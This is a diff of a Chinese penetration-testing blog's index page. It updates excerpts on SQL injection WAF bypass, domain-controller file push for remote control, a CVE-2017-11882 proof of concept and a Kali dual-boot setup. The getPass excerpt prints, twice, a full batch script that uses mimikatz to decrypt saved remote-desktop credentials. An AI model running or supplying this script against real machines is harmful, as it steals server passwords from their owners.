@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.7.1">
+<meta name="generator" content="Hexo 5.2.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-pig.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-pig.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-pig.png">
@@ -28,9 +28,9 @@
 <meta property="og:title" content="redn3ck&#39;s blog">
 <meta property="og:url" content="https://redn3ck.github.io/page/2/index.html">
 <meta property="og:site_name" content="redn3ck&#39;s blog">
-<meta property="og:locale" content="zh-CN">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="redn3ck">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="redn3ck&#39;s blog">
 
 <link rel="canonical" href="https://redn3ck.github.io/page/2/">
 
@@ -193,7 +193,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/03/28/Mysql注入-Sqlmap之tamper编写/">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/blogAvatar2.jpg">
@@ -207,7 +207,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/03/28/Mysql注入-Sqlmap之tamper编写/" class="post-title-link" itemprop="url">Mysql注入 - Sqlmap之tamper编写</a>
+            <a href="/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/" class="post-title-link" itemprop="url">双系统安装 - win7下安装kali2.0</a>
         </h2>
 
         <div class="post-meta">
@@ -217,36 +217,24 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-03-28 20:15:09" itemprop="dateCreated datePublished" datetime="2018-03-28T20:15:09+08:00">2018-03-28</time>
+              <time title="创建时间：2018-04-19 00:33:09" itemprop="dateCreated datePublished" datetime="2018-04-19T00:33:09+08:00">2018-04-19</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2018-05-04 08:46:54" itemprop="dateModified" datetime="2018-05-04T08:46:54+08:00">2018-05-04</time>
+                <time title="修改时间：2018-04-24 00:14:13" itemprop="dateModified" datetime="2018-04-24T00:14:13+08:00">2018-04-24</time>
               </span>
 
           
-            <span id="/2018/03/28/Mysql注入-Sqlmap之tamper编写/" class="post-meta-item leancloud_visitors" data-flag-title="Mysql注入 - Sqlmap之tamper编写" title="阅读次数">
+            <span id="/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/" class="post-meta-item leancloud_visitors" data-flag-title="双系统安装 - win7下安装kali2.0" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数：</span>
               <span class="leancloud-visitors-count"></span>
             </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2018/03/28/Mysql注入-Sqlmap之tamper编写/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/03/28/Mysql注入-Sqlmap之tamper编写/" itemprop="commentCount"></span>
-    </a>
-  </span>
   
   
 
@@ -259,13 +247,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass @"></a>Bypass <code>@</code></h1><img src="/2018/03/28/Mysql注入-Sqlmap之tamper编写/bypass@error.png">
-<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
-<img src="/2018/03/28/Mysql注入-Sqlmap之tamper编写/bypass@.png">
-<h1 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h1>
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>旧笔记本淘汰了，卖掉可惜，扔了更可惜，平时经常有破解wifi的需要，干脆把它做成双系统，win+linux两不误，由于我的华硕是UEFI+GPT，导致我双系统怎么都装不成功，由此开启了我崎岖的踩坑路。</p>
+<h1 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h1><p>先恶补一波BIOS，MBR，UEFI，GPT</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://baijiahao.baidu.com/s?id=1571449106519556&wfr=spider&for=pc">还没弄明白BIOS+MBR和UEFI+GPT？看这一篇讲解就足够了！</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mao0514/article/details/51162915">EFI、UEFI、MBR、GPT的区别</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28471913">UEFI+GPT与BIOS+MBR各自有什么优缺点？</a></p>
+</blockquote>
+<p>看了这些应该有了一定的认识，一般组合为：</p>
+<ul>
+<li>UEFI + GPT</li>
+<li>BIOS + MBR</li>
+</ul>
+<p>我2012年买的华硕，已经默认是UEFI+GPT，当时还因为这个原因导致无法重装系统，现在装双系统，又碰到该问题，简直头皮发麻，不管怎么说，目的得先达到——安装双系统win+kali2.0。</p>
+<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/03/28/Mysql注入-Sqlmap之tamper编写/#more" rel="contents">
+              <a class="btn" href="/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -289,7 +287,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/blogAvatar2.jpg">
@@ -303,7 +301,104 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/03/01/域渗透-域控下发文件并执行远控/" class="post-title-link" itemprop="url">域渗透 - 域控下发文件并执行远控</a>
+            <a href="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/" class="post-title-link" itemprop="url">Mysql注入 - Sqlmap之tamper编写</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-03-28 20:15:09" itemprop="dateCreated datePublished" datetime="2018-03-28T20:15:09+08:00">2018-03-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-05-04 08:46:54" itemprop="dateModified" datetime="2018-05-04T08:46:54+08:00">2018-05-04</time>
+              </span>
+
+          
+            <span id="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/" class="post-meta-item leancloud_visitors" data-flag-title="Mysql注入 - Sqlmap之tamper编写" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass @"></a>Bypass <code>@</code></h1><img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
+<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
+<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
+
+<h1 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blogAvatar2.jpg">
+      <meta itemprop="name" content="redn3ck">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="redn3ck's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/" class="post-title-link" itemprop="url">域渗透 - 域控下发文件并执行远控</a>
         </h2>
 
         <div class="post-meta">
@@ -324,7 +419,7 @@
               </span>
 
           
-            <span id="/2018/03/01/域渗透-域控下发文件并执行远控/" class="post-meta-item leancloud_visitors" data-flag-title="域渗透 - 域控下发文件并执行远控" title="阅读次数">
+            <span id="/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/" class="post-meta-item leancloud_visitors" data-flag-title="域渗透 - 域控下发文件并执行远控" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -339,8 +434,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2018/03/01/域渗透-域控下发文件并执行远控/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/03/01/域渗透-域控下发文件并执行远控/" itemprop="commentCount"></span>
+    <a title="valine" href="/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -362,7 +457,7 @@
 <p>域成员登录时，执行域控提前部署好的bat脚本，通过此脚本，IPC连接到域控，copy文件，在成员上执行。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/03/01/域渗透-域控下发文件并执行远控/#more" rel="contents">
+              <a class="btn" href="/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -386,7 +481,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/01/18/getPass-一键批量获取远程终端凭据密码/">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/blogAvatar2.jpg">
@@ -400,7 +495,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/01/18/getPass-一键批量获取远程终端凭据密码/" class="post-title-link" itemprop="url">getPass - 一键批量获取远程终端凭据密码</a>
+            <a href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">getPass - 一键批量获取远程终端凭据密码</a>
         </h2>
 
         <div class="post-meta">
@@ -421,7 +516,7 @@
               </span>
 
           
-            <span id="/2018/01/18/getPass-一键批量获取远程终端凭据密码/" class="post-meta-item leancloud_visitors" data-flag-title="getPass - 一键批量获取远程终端凭据密码" title="阅读次数">
+            <span id="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" class="post-meta-item leancloud_visitors" data-flag-title="getPass - 一键批量获取远程终端凭据密码" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -436,8 +531,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2018/01/18/getPass-一键批量获取远程终端凭据密码/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/01/18/getPass-一键批量获取远程终端凭据密码/" itemprop="commentCount"></span>
+    <a title="valine" href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -453,15 +548,15 @@
 
       
           <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374152&amp;idx=2&amp;sn=53def8b9c8301d0c027cad32e8982c1a&amp;chksm=beb083b489c70aa2474210a70a15ef7d978bd1a3b29de0ead7da65261cd7bd027364a2494ea2&amp;mpshare=1&amp;scene=23&amp;srcid=12298b5FBQUycN1sXhWdm6gV#rd" target="_blank" rel="noopener">【奇技淫巧】破解远程终端凭据，获取服务器密码</a> </p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&mid=2650374152&idx=2&sn=53def8b9c8301d0c027cad32e8982c1a&chksm=beb083b489c70aa2474210a70a15ef7d978bd1a3b29de0ead7da65261cd7bd027364a2494ea2&mpshare=1&scene=23&srcid=12298b5FBQUycN1sXhWdm6gV#rd">【奇技淫巧】破解远程终端凭据，获取服务器密码</a> </p>
 </blockquote>
 <p>想必大家都看了这篇文章吧，土司12月推送的，非常好的破解方式，内网中能起到相当大的作用，相信不少人已经去实践了一遍，过程之繁琐真是让我们这些人望而却步。</p>
 <p>我可不想每拿到一台内网机，都要重复的去做这么复杂的操作，而且每一个凭据都要做一遍。</p>
 <p>对批处理不熟，花了几天时间，写了个bat，一键批量获取。</p>
-<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] <span class="built_in">Start</span>. Code by redn3ck.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> flag=<span class="number">0</span>	<span class="built_in">REM</span> 判断是否存在Credentials</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /a/s/b c:\Users\Administrator\AppData\Local\Microsoft\Credentials') <span class="keyword">do</span> (</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%%i</span> (</span><br><span class="line">		<span class="built_in">set</span> file=<span class="variable">%%i</span></span><br><span class="line">		<span class="built_in">set</span> flag=<span class="number">1</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">!file!</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> /f "delims=: tokens=<span class="number">1</span>,<span class="number">2</span>" <span class="variable">%%i</span> <span class="keyword">in</span> ('mimikatz.exe "dpapi::cred /<span class="keyword">in</span>:<span class="variable">!file!</span>" "<span class="keyword">exit</span>" ^| <span class="built_in">findstr</span> guidMasterKey') <span class="keyword">do</span> <span class="built_in">set</span> guidMasterKey=<span class="variable">%%j</span></span><br><span class="line"><span class="comment">		REM echo !guidMasterKey!</span></span><br><span class="line"></span><br><span class="line">		mimikatz "privilege::debug" "sekurlsa::dpapi" "<span class="keyword">exit</span>" &gt; MasterKey.txt</span><br><span class="line">			</span><br><span class="line"><span class="comment">		REM findstr /n 返回行号 example: 1:       * GUID      :  &#123;b619a08d-f4c3-408d-b733-bc89bd94ca0b&#125;</span></span><br><span class="line">		<span class="keyword">for</span> /f "delims=:" <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">findstr</span> /n "<span class="variable">!guidMasterKey!</span>" MasterKey.txt') <span class="keyword">do</span> (</span><br><span class="line">		<span class="built_in">set</span> /a lineNum=<span class="variable">%%i</span>+<span class="number">1</span></span><br><span class="line"><span class="comment">		REM echo !lineNum!</span></span><br><span class="line">		<span class="keyword">call</span> :next</span><br><span class="line">		)</span><br><span class="line">	)</span><br><span class="line">)</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">if</span> <span class="variable">!flag!</span>==<span class="number">0</span> <span class="built_in">echo</span> [-] No credentials :(</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] End</span><br><span class="line"><span class="keyword">exit</span> /b	</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line"><span class="keyword">for</span> /f "skip=<span class="variable">%lineNum%</span> delims=" <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">type</span> MasterKey.txt') <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> MasterKeyTemp=<span class="variable">%%i</span></span><br><span class="line"><span class="keyword">goto</span> next2</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:next2</span><br><span class="line"><span class="built_in">set</span> MasterKey=<span class="variable">%MasterKeyTemp:~16%</span></span><br><span class="line"><span class="comment">REM echo %MasterKey%</span></span><br><span class="line">mimikatz "dpapi::cred /<span class="keyword">in</span>:<span class="variable">%file%</span> /masterkey:<span class="variable">%MasterKey%</span>" "<span class="keyword">exit</span>" &gt; pass.txt</span><br><span class="line"><span class="built_in">findstr</span> "TargetName UserName CredentialBlob" pass.txt</span><br><span class="line"><span class="built_in">del</span> MasterKey.txt</span><br></pre></td></tr></table></figure>
+<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] <span class="built_in">Start</span>. Code by redn3ck.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> flag=<span class="number">0</span>	<span class="built_in">REM</span> 判断是否存在Credentials</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">dir</span> /a/s/b c:\Users\Administrator\AppData\Local\Microsoft\Credentials&#x27;) <span class="keyword">do</span> (</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%%i</span> (</span><br><span class="line">		<span class="built_in">set</span> file=<span class="variable">%%i</span></span><br><span class="line">		<span class="built_in">set</span> flag=<span class="number">1</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">!file!</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> /f &quot;delims=: tokens=<span class="number">1</span>,<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;mimikatz.exe &quot;dpapi::cred /<span class="keyword">in</span>:<span class="variable">!file!</span>&quot; &quot;<span class="keyword">exit</span>&quot; ^| <span class="built_in">findstr</span> guidMasterKey&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> guidMasterKey=<span class="variable">%%j</span></span><br><span class="line"><span class="comment">		REM echo !guidMasterKey!</span></span><br><span class="line"></span><br><span class="line">		mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; &quot;<span class="keyword">exit</span>&quot; &gt; MasterKey.txt</span><br><span class="line">			</span><br><span class="line"><span class="comment">		REM findstr /n 返回行号 example: 1:       * GUID      :  &#123;b619a08d-f4c3-408d-b733-bc89bd94ca0b&#125;</span></span><br><span class="line">		<span class="keyword">for</span> /f &quot;delims=:&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">findstr</span> /n &quot;<span class="variable">!guidMasterKey!</span>&quot; MasterKey.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line">		<span class="built_in">set</span> /a lineNum=<span class="variable">%%i</span>+<span class="number">1</span></span><br><span class="line"><span class="comment">		REM echo !lineNum!</span></span><br><span class="line">		<span class="keyword">call</span> :next</span><br><span class="line">		)</span><br><span class="line">	)</span><br><span class="line">)</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">if</span> <span class="variable">!flag!</span>==<span class="number">0</span> <span class="built_in">echo</span> [-] No credentials :(</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] End</span><br><span class="line"><span class="keyword">exit</span> /b	</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line"><span class="keyword">for</span> /f &quot;skip=<span class="variable">%lineNum%</span> delims=&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> MasterKey.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> MasterKeyTemp=<span class="variable">%%i</span></span><br><span class="line"><span class="keyword">goto</span> next2</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:next2</span><br><span class="line"><span class="built_in">set</span> MasterKey=<span class="variable">%MasterKeyTemp:~16%</span></span><br><span class="line"><span class="comment">REM echo %MasterKey%</span></span><br><span class="line">mimikatz &quot;dpapi::cred /<span class="keyword">in</span>:<span class="variable">%file%</span> /masterkey:<span class="variable">%MasterKey%</span>&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pass.txt</span><br><span class="line"><span class="built_in">findstr</span> &quot;TargetName UserName CredentialBlob&quot; pass.txt</span><br><span class="line"><span class="built_in">del</span> MasterKey.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/01/18/getPass-一键批量获取远程终端凭据密码/#more" rel="contents">
+              <a class="btn" href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -551,10 +646,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/embedi/CVE-2017-11882</a></p>
+          <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><a target="_blank" rel="noopener" href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
 <p>如何使用，作者github里写的很清楚</p>
 <p>附上自测gif</p>
-<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif">
+<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
+
+
 <h1 id="BTW"><a href="#BTW" class="headerlink" title="BTW"></a>BTW</h1><p>现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功</p>
 <p>具体环境：win10 [10.0.16299.64] + 破解激活过的office2016</p>
 
@@ -644,11 +741,11 @@
       
           <h2 id="变量覆盖导致注入"><a href="#变量覆盖导致注入" class="headerlink" title="变量覆盖导致注入"></a>变量覆盖导致注入</h2><ol>
